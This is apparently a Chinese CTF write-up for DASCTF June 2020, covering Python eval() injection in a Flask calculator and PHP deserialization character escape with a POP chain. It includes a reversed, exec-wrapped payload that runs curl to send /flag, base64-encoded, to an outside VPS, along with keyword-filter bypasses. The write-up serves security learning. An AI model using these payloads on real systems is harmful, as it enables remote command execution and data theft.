---
title: DASCTF2020.6月赛
date: 2020-06-27
image: 
description: 
categories: 
- ctf_writeup
tags:
- 命令注入
- PHP反序列化
---
因为和第五空间连着，然后昨天下午又去打了一场AWD，感觉身体掏空，就认真打了DASCTF（咕咕咕），剩下的题目等有机会再复现

------

### 简单的计算器-1

考点：python eval()代码注入，命令执行结果外带

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120171633.png)

访问Source可以看到源码：

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from flask import Flask, render_template, request,session
from config import black_list,create
import os
 
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
 
## flag is in /flag try to get it
 
@app.route('/', methods=['GET', 'POST'])
def index():
 
    def filter(string):#这里是下午暗改过的，本来只过滤了or
        for black_word in black_list:
            if black_word in string:
                return "hack"
        return string
 
    if request.method == 'POST':
        input = request.form['input']
        create_question = create()
        input_question = session.get('question')
        session['question'] = create_question
        if input_question==None:
            return render_template('index.html', answer="Invalid session please try again!", question=create_question)
        if filter(input)=="hack":
            return render_template('index.html', answer="hack", question=create_question)
        try:
            calc_result = str((eval(input_question + "=" + str(input))))
            if calc_result == 'True':
                result = "Congratulations"
            elif calc_result == 'False':
                result = "Error"
            else:
                result = "Invalid"
        except:
            result = "Invalid"
        return render_template('index.html', answer=result,question=create_question)
 
    if request.method == 'GET':
        create_question = create()
        session['question'] = create_question
        return render_template('index.html',question=create_question)
 
@app.route('/source')
def source():
        return open("app.py", "r").read()
 
if __name__ == '__main__':
    app.run(host="0.0.0.0", debug=False)
```

可以看到，31行那里把我们的结果和一个表达式进行简单的字符串拼接之后eval直接执行，这就给了我们命令注入的机会；

我们来本地试一下：

```
#python3
import os
 
input_question = '100000='
input = "1,os.system(\'dir\')"
 
calc_result = str((eval(input_question + "=" + str(input))))
print(calc_result)
```

我们发现dir命令确实被执行了，但是题目没有回显，我们就只能用其他方式外带到我们的VPS上面去

那么剩下的就只有绕waf了

fuzz了一下，sys，import，os这些关键词过滤了，但是exec这些没有被过滤

可以考虑字符串拼接或者逆读绕过，这里用的是逆读：

```
import os
 
str = '''os.popen("curl ip:端口/?a=`cat /flag|base64`").read()'''#因为sys倒过来也是sys，所以换成popen
print(str[::-1])
#exec(')(daer.)"`46esab|galf/ tac`=a?/0058:4.751.011.95 lruc"(nepop.so'[::-1])
```

发送payload，监听VPS相应端口，得到flag；

 

### 简单的计算器-2

考点：？？？

看了下源码：

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from flask import Flask, render_template, request,session
from config import black_list,create
import os
 
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
 
## flag is in /flag try to get it
 
@app.route('/', methods=['GET', 'POST'])
def index():
 
    def filter(string):
        for black_word in black_list:
            if black_word in string:
                return "hack"
        return string
 
    if request.method == 'POST':
        input = request.form['input']
        create_question = create()
        input_question = session.get('question')
        session['question'] = create_question
        if input_question == None:
            return render_template('index.html', answer="Invalid session please try again!", question=create_question)
        if filter(input)=="hack":
            return render_template('index.html', answer="hack", question=create_question)
        calc_str = input_question + "=" + str(input)
        try:
            calc_result = str((eval(calc_str)))
        except Exception as ex:
            calc_result = "Invalid"
        return render_template('index.html', answer=calc_result,question=create_question)
 
    if request.method == 'GET':
        create_question = create()
        session['question'] = create_question
        return render_template('index.html',question=create_question)
 
@app.route('/source')
def source():
        return open("app.py", "r").read()
 
if __name__ == '__main__':
    app.run(host="0.0.0.0", debug=False)
```

大同小异；

用上一道题的payload直接秒了……啊……这……

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120171646.png)

可能本来上一道题的不需要绕waf，但是后来暗改了之后改成一道题了。。。

后来和学长交流，说是可以用沙箱逃逸来做，可能沙箱逃逸才是想考的。

 

 

 

### phpuns

考点：反序列化字符逃逸，pop链，16进制绕过关键字

直接给了源码的附件：[DASCTF_2020.6_反序列化_source](https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/DASCTF2020.6/DASCTF_2020.6_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.zip)

先构造pop链；

#### POP链利用

很明显class.php里面的类是给我们利用的，构造很简单：

```
$pop = new Hacker_A;
$pop->c2e38 = new Hacker_B;
$pop->c2e38->c2e38 = new Hacker_C;
```

生成了：

```
O:8:"Hacker_A":1:{s:5:"c2e38";O:8:"Hacker_B":1:{s:5:"c2e38";O:8:"Hacker_C":1:{s:4:"name";s:4:"test";}}}
#一共103个字符
```

 

#### 反序列化字符逃逸

我们可以看到index.php第29行调用了add函数：

```
$_SESSION['info'] = add(serialize($user));
```

然后info.php第6行调用了reduce函数：

```
$tmp = unserialize(reduce($_SESSION['info']));
```

我们去看functions.php里面这两个函数的定义：

```
function add($data)
{
    $data = str_replace(chr(0).'*'.chr(0), '\0*\0', $data);
    return $data;
}
 
function reduce($data)
{
    $data = str_replace('\0*\0', chr(0).'*'.chr(0), $data);
    return $data;
}
```

`chr(0).'*'.chr(0)` 也就是 `N*N` （N表示null）占三个字符，而 `\0*\0` 占五个字符，当我们的 `\0*\0` 被替换为 `N*N` 之后就少了两个字符，于是我们就能在反序列化中吞掉后面两个字符；（参考本站：[安恒4月赛反序列化字符逃逸](http://wh1sper.com/fakephp反序列化字符逃逸/)）

如果我们直接把pop链构造的结果传给password的话，序列化的结果是这样：

```
s:8:"username";s:5:"input";s:8:"password";s:103:"O:8:"Hacker_A":1:{s:5:"c2e38";O:8:"Hacker_B":1:{s:5:"c2e38";O:8:"Hacker_C":1:{s:4:"name";s:4:"test";}}}"
```

我们这103个字符被因为s:103被当作字符串处理，于是我们利用吞字符，把 `";s:8:"password";s:103:"` （24个字符，12组 `\0*\0` ）这一段吞掉，然后把下面的传给password：

```
";s:8:"password";O:8:"Hacker_A":1:{s:5:"c2e38";O:8:"Hacker_B":1:{s:5:"c2e38";O:8:"Hacker_C":1:{s:4:"name";s:4:"test";}}}
```

那么我们就成功的就行了逃逸；

 

不过，在反序列化之前，info.php里面第5行有： `check(reduce($_SESSION['info']));`

check函数会检查我们的字符里面是否有 `c2e38` ，所以用S:5:"\63\32\65\33\38"来绕过，和用S+\00来绕过chr(0)是一样的，因为S大写，后面字符串里就可以解析hex了

 